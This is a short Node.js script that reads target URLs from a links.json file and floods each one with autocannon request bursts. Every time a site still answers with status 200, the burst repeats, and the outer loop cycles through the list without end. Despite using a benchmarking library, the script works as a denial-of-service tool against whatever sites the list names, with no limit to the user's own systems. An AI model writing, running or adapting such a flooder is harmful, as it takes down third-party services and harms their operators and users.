import fs from 'fs/promises'
import * as path from 'path';
import axios from "axios";
import autocannon from 'autocannon'
import { fileURLToPath } from 'url';

axios.defaults.timeout = 5000

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const cancelRequest = new AbortController();

( async () => {
    let address = "links.json";

    const _getLinks = async (pathToJSON)=> {
        let fileJSON =  await fs.readFile( path.join(__dirname, pathToJSON), "utf-8");
        return JSON.parse(fileJSON)
    }

    const _getHTML = async (httpAddress) => {
        try {
            const response = await axios(
                httpAddress, {
                signal: cancelRequest.signal,
            }, );
            console.log('address', httpAddress, " code:", response.status);
            return response;
        } catch (error) {
            if (error.name === 'AbortError') {
                console.error('address', httpAddress, 'Request was aborted');
                return { status: 600}
            } else {
                console.error('address', httpAddress, "error:", error.code);
                return { status: 700}
            }
        }
    }

    const _startCannon = async ( link ) => {
        return await autocannon({
            url: link,
            connections: 10, //default
            pipelining: 2, // default
            duration: 50, // default
            workers: 2,
            amount: 500,
            excludeErrorStats: true
        })
    }

    const cannonUrl =  async (httpAddress) => {
        try {
            const { status } = await _getHTML(httpAddress)
            if (status === 200){
                await _startCannon (httpAddress)
                await cannonUrl(httpAddress)
            }
            return false
        } catch (error) {
            return false
        }
    }

    let arrLinks = await _getLinks(address);

    if (!arrLinks.length){
        throw new Error('wrong file format')
    }

    const start = async () => {
        for (let link of arrLinks) {
            await cannonUrl(link)
        }
        await start()
    }
    await start()
})()

